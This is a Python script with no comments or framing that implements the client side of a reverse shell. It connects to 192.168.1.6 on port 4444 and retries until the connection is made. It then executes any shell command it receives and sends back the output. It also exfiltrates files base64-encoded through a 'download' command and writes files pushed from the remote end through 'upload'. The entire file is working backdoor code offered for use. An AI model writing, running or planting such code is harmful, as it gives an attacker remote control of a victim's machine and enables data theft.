import socket
import json
import subprocess
import os
import base64
import time

def server(ip,port):
    global con

    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            con.connect((ip,port))
            break
        except ConnectionRefusedError:
            print("connection refused .Retrying in 5s")
            time.sleep(5)
    


def send(data):
    json_data=json.dumps(data)
    con.send(json_data.encode('utf-8'))

def recieve():
    json_data= ''
    while True:
        try:
            json_data += con.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        cmd = recieve()
        if cmd == 'exit':
            break
        elif cmd[:2] == 'cd' and len(cmd)>1:
            try:
                os.chdir(cmd[3:])
            except FileNotFoundError:
                print('Folder does not exist')
                continue
        elif cmd[:8] == 'download':
            with open(cmd[9:],'rb') as f:
                send(base64.b64encode(f.read()).decode('utf-8'))
        elif cmd[:6] == 'upload':
            with open(cmd[7:],'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        else:
            prc = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
            rslt = prc.stdout.read()+prc.stderr.read()
            send(rslt)

server('192.168.1.6',4444)
run()